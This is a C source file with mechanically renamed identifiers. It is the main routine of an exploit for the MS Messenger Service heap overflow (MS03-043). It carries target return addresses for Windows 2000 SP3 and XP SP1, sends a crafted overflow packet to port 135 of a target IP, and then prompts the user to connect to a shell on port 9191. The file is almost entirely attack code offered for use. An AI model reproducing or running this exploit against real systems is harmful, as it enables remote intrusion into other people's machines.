
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int targetUDP ;
typedef int targetOS ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int packet ;
typedef int WSADATA ;
typedef int DWORD ;


 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 (unsigned char*,int,int,int) ;
 int VAR_2 ;
 char* VAR_3 ;
 int FUNC_1 (int,int *) ;
 int FUNC_2 (struct sockaddr_in*,int) ;
 int FUNC_3 (char*) ;
 int FUNC_4 (int) ;
 int FUNC_5 (char*) ;
 int FUNC_6 (char*,...) ;
 int FUNC_7 (int,unsigned char*,int,int ,struct sockaddr*,int) ;
 int FUNC_8 (int ,int ,int ) ;

int FUNC_9(int VAR_4,char *VAR_5[])
{
        int VAR_6,VAR_7,VAR_8, VAR_9,VAR_10;
        unsigned char VAR_11[8192];
        struct sockaddr_in VAR_12;
  WSADATA VAR_13;

  struct
  {
   char os[30];
   DWORD SEH;
   DWORD JMP;
  } VAR_14[] =
  {
   {
    "Windows 2000 SP 3 (en)",
    0x77ee044c,
    0x768d693e
   },
   {
    "Windows XP SP 1 (en)",
    0x77ed73b4,
    0x7804bf52
   }





  };


  FUNC_6("\n-=[ MS Messenger Service Heap Overflow Exploit (MS03-043) ver %s ]=-\n\n"
       " by Adik < netmaniac [at] hotmail.KG >\n http://netninja.to.kg\n\n", VAR_3);

  if(VAR_4 < 3)
  {
   FUNC_6(" Target OS version:\n\n");
   for(VAR_8=0;VAR_8<(sizeof(VAR_14)/sizeof(VAR_14[0]));VAR_8++)
    FUNC_6(" [%d]\t%s\n",VAR_8,VAR_14[VAR_8].os);
   FUNC_6("\n Usage: %s [TargetIP] [ver: 0 | 1]\n"
     " eg: msgr.exe 192.168.63.130 0\n",VAR_5[0]);
   return 1;
  }
  VAR_7 = FUNC_3(VAR_5[2]);
  FUNC_6("[*] Target: \t IP: %s\t OS: %s\n"
      "[*] UEF: \t 0x%x\n"
      "[*] JMP: \t 0x%x\n\n", VAR_5[1],VAR_14[VAR_7].os, VAR_14[VAR_7].SEH, VAR_14[VAR_7].JMP);

        FUNC_1(0x0202, &VAR_13);
  FUNC_6("[*] WSAStartup initialized...\n");

        FUNC_2(&VAR_12, sizeof(VAR_12));

        VAR_12.sin_family = VAR_0;
        VAR_12.sin_addr.s_addr = FUNC_5(VAR_5[1]);
        VAR_12.sin_port = FUNC_4(135);

  VAR_9 = FUNC_0(VAR_11,sizeof(VAR_11),VAR_14[VAR_7].JMP,VAR_14[VAR_7].SEH);

        if ((VAR_6 = FUNC_8(VAR_0, VAR_2, VAR_1)) == -1)
  {
    FUNC_6("[x] Socket not initialized! Exiting...\n");
                return 1;
  }
  FUNC_6("[*] Socket initialized...\n");
  FUNC_6("[*] Injecting packet into a remote process...\n");

  if (FUNC_7(VAR_6, VAR_11, VAR_9, 0, (struct sockaddr *)&VAR_12, sizeof(VAR_12)) == -1)
  {
   FUNC_6("[x] Failed to inject packet! Exiting...\n");
            return 1;
  }
  else
   FUNC_6("[*] Packet injected...\n");

  FUNC_6("[i] Try connecting to %s:9191\n\n",VAR_5[1]);
        return 0;
}
